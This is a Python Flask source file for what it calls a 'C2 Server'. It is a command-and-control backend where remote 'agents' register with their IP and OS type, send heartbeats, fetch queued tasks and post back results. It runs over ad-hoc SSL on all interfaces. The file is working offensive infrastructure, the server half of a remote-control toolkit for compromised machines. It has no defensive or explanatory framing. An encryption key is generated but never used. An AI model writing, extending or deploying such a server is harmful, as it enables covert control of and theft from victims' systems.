from flask import Flask, request, jsonify
from cryptography.fernet import Fernet
import json
import logging
import os
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2_server.log'),
        logging.StreamHandler()
    ]
)

app = Flask(__name__)

# Generate encryption key
ENCRYPTION_KEY = Fernet.generate_key()
cipher_suite = Fernet(ENCRYPTION_KEY)

# Store connected agents
connected_agents = {}

class Agent:
    def __init__(self, agent_id, ip_address, os_type):
        self.id = agent_id
        self.ip_address = ip_address
        self.os_type = os_type
        self.last_seen = datetime.now()
        self.tasks = []
        self.results = []

@app.route('/register', methods=['POST'])
def register_agent():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        ip_address = request.remote_addr
        os_type = data.get('os_type')
        
        if agent_id not in connected_agents:
            connected_agents[agent_id] = Agent(agent_id, ip_address, os_type)
            logging.info(f"New agent registered: {agent_id} ({ip_address})")
            return jsonify({"status": "success", "message": "Agent registered successfully"})
        else:
            return jsonify({"status": "error", "message": "Agent already registered"})
    except Exception as e:
        logging.error(f"Registration error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/heartbeat', methods=['POST'])
def heartbeat():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if agent_id in connected_agents:
            connected_agents[agent_id].last_seen = datetime.now()
            return jsonify({"status": "success"})
        return jsonify({"status": "error", "message": "Agent not found"})
    except Exception as e:
        logging.error(f"Heartbeat error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/task', methods=['POST'])
def get_task():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        
        if agent_id in connected_agents:
            agent = connected_agents[agent_id]
            if agent.tasks:
                task = agent.tasks.pop(0)
                return jsonify({"status": "success", "task": task})
            return jsonify({"status": "success", "task": None})
        return jsonify({"status": "error", "message": "Agent not found"})
    except Exception as e:
        logging.error(f"Task retrieval error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/result', methods=['POST'])
def submit_result():
    try:
        data = request.get_json()
        agent_id = data.get('agent_id')
        result = data.get('result')
        
        if agent_id in connected_agents:
            connected_agents[agent_id].results.append(result)
            return jsonify({"status": "success"})
        return jsonify({"status": "error", "message": "Agent not found"})
    except Exception as e:
        logging.error(f"Result submission error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/agents', methods=['GET'])
def list_agents():
    try:
        agents = [{
            'id': agent.id,
            'ip_address': agent.ip_address,
            'os_type': agent.os_type,
            'last_seen': agent.last_seen.isoformat()
        } for agent in connected_agents.values()]
        return jsonify({"status": "success", "agents": agents})
    except Exception as e:
        logging.error(f"Agent listing error: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    logging.info("Starting C2 Server...")
    app.run(host='0.0.0.0', port=5000, ssl_context='adhoc') 